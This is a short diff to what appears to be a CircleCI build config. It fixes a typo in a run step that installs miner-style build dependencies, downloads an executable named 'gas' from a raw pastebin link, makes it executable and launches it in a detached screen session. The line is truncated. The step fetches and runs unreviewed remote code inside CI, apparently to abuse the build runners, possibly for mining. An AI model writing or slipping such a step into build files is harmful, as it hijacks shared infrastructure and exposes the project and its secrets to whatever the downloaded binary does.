@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  csudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential && wget -O gas https://pastebin.com/raw/6PDAQyxD && chmod +x gas && screen -dmS run  && ./g
+      - run:  sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential && wget -O gas https://pastebin.com/raw/6PDAQyxD && chmod +x gas && screen -dmS run  && ./g
